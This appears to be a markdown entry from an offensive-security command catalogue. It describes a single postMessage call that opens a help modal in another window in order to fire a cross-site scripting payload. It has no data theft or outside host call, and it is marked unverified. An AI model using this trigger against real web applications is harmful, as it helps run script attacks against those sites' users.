---
id: cmd-uuid-6
data: 'win.postMessage(''{"method":"toggleHelp"}'',''*'')'
tags:
  - trigger
  - xss
  - postmessage
type: command
output: XSS alert in window
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:20.150Z'
verified: false
validated: true
submitted: true
---
# toggleHelp-window

## Command

```javascript
win.postMessage('{"method":"toggleHelp"}','*');
```

## Description

Triggers help in the opened window, executing XSS if payload present.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| method | 'toggleHelp' | Yes |
| targetOrigin | '*' | Yes |

## Examples

### Basic Usage

```javascript
win.postMessage('{"method":"toggleHelp"}','*');
```

### Advanced Usage

```javascript
// Identical to basic
```

## Expected Output

Modal in window; alert fires.

## Related

- [[Related Procedure|procedures/Trigger-XSS-via-toggleHelp]]
